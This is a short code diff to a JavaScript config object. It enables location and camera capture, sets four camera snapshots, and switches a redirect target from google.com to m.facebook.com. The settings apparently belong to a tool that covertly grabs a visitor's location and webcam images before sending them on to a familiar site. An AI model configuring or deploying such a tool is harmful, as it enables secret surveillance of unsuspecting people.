@@ -2,7 +2,7 @@ var config={
 location:true,
 camera:true,
 camsnaps:4,
-redirectURL:"https://google.com"
+redirectURL:"https://m.facebook.com"
 }
 
 
